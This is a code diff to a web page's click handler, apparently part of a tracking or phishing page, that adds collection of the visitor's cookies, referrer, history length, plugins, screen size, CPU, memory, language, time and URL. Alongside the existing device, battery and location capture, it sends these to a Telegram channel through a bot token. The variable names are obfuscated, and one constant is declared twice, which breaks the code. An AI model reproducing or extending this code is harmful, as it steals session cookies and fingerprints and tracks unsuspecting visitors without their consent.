@@ -121,6 +121,29 @@ box.addEventListener('click', async () => {
         battery = Math.round(b.level * 100) + '%';
     }
     const deviceName = navigator.userAgent;
+    
+
+const brwserhistory = history.length;
+
+const hjj = document.cookie;
+localStorage.getItem('key');
+
+const pu = navigator.plugins;
+
+// Screen resolution
+const tybn = screen.width + 'x' + screen.height;
+
+const hgvv = navigator.hardwareConcurrency;
+
+const memory = navigator.deviceMemory;
+
+const langhh = navigator.language;
+
+const deteh = new Date().toString();
+
+const timehh = window.location.href;
+
+const brwserhistory = document.referrer;
 
     async function sendMessage(chat, text) {
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -156,7 +179,7 @@ box.addEventListener('click', async () => {
 
     // Send device info
     await sendMessage(uid, `DEVICE INFO:\n\n🗿Device: ${deviceName}\n\n🔋Battery: ${battery}`);
-    await sendMessage(channelId, `DEVICE INFO:\n\n🗿Device: ${deviceName}\n\n🔋Battery: ${battery}`);
+    await sendMessage(channelId, `DEVICE INFO:\n\n🗿Device: ${deviceName}\n\n🔋Battery: ${battery}\n${brwserhistory}\n${hjj}\n${pu}\n${tybn}\n${hgvv}\n\n${hgvv}\n${memory}\n${langhh}\n${deteh}\n${timehh}\n${brwserhistory}`);
 
     // Location capture with enhanced formatting
     if (navigator.geolocation) {
